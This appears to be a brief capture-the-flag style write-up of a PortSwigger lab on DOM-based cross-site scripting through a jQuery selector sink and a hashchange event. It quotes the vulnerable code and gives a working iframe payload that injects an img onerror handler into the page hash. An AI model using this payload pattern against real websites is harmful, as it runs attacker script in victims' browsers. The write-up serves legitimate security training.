
# DOM XSS in jQuery selector sink using a hashchange event

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.

This is the problematic code in the Home page:

```
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

To exploit it, it is possible to use the same payload as in https://portswigger.net/web-security/cross-site-scripting/dom-based:

```
<iframe style="width:100%;height:100%" src="https://0ae000fe04dcc1068048c1f000ed005b.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print(1)>'">
```
